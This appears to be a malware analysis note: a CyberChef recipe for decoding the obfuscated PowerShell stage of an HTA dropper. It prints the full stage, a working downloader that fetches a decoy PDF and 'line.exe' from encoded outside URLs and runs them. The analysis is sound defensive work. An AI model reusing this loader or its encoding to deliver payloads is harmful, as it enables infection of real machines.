### CyberChef Recipe

Inital hash: D88EE271FCA9CC237C2C5A8EFCC744DB  (line.hta)

#### Stage 2 - PowerShell Deobfuscation

##### Input - Obfusacted PS code extracted from PS present inside VBScript
```
function Lcr($nTU, $hwz){[IO.File]::WriteAllBytes($nTU, $hwz)};function WAJ($nTU){if($nTU.EndsWith((Ddy @(7436,7490,7498,7498))) -eq $True){rundll32.exe $nTU }elseif($nTU.EndsWith((Ddy @(7436,7502,7505,7439))) -eq $True){powershell.exe -ExecutionPolicy unrestricted -File $nTU}elseif($nTU.EndsWith((Ddy @(7436,7499,7505,7495))) -eq $True){misexec /qn /i $nTU}else{Start-Process $nTU}};function YGh($xyW){$wsP = New-Object (Ddy @(7468,7491,7506,7436,7477,7491,7488,7457,7498,7495,7491,7500,7506));[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12;$hwz = $wsP.DownloadData($xyW);return $hwz};function Ddy($RxM){$kax=7390;$SJm=$Null;foreach($HVe in $RxM){$SJm+=[char]($HVe-$kax)};return $SJm};function fTz(){$dLJ = $env:AppData + '\';$doScRGuE= $env:AppData;$VVHwWCD = $doScRGuE + '\blank.pdf';If(Test-Path -Path $VVHwWCD){Invoke-Item $VVHwWCD;}Else{ $erJpPjb = YGh (Ddy @(7494,7506,7506,7502,7505,7448,7437,7437,7499,7487,7493,7436,7509,7489,7501,7501,7499,7490,7436,7501,7504,7493,7437,7507,7502,7498,7501,7487,7490,7505,7437,7440,7438,7439,7446,7437,7438,7443,7437,7488,7498,7487,7500,7497,7436,7502,7490,7492));Lcr $VVHwWCD $erJpPjb;Invoke-Item $VVHwWCD;};;;$BfXjD = $dLJ + 'line.exe'; if (Test-Path -Path $BfXjD){WAJ $BfXjD;}Else{ $pKfhMHQKM = YGh (Ddy @(7494,7506,7506,7502,7505,7448,7437,7437,7494,7495,7503,7505,7501,7498,7507,7506,7495,7501,7500,7436,7489,7501,7499,7437,7498,7495,7500,7491,7436,7491,7510,7491));Lcr $BfXjD $pKfhMHQKM;WAJ $BfXjD;};;}fTz;
```

##### Recipe
```
Generic_Code_Beautify()
Subsection('@\\([^)]*\\)',true,true,false)
Find_/_Replace({'option':'Regex','string':'[@()]'},'',true,false,true,false)
Find_/_Replace({'option':'Regex','string':','},'\\n',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'$'},',7390',true,false,true,false)
Fork('\\n','',false)
Subtract('Comma')
From_Decimal('Space',false)
Merge(true)
Find_/_Replace({'option':'Regex','string':'Ddy'},'',true,false,true,false)
Syntax_highlighter('powershell')
```

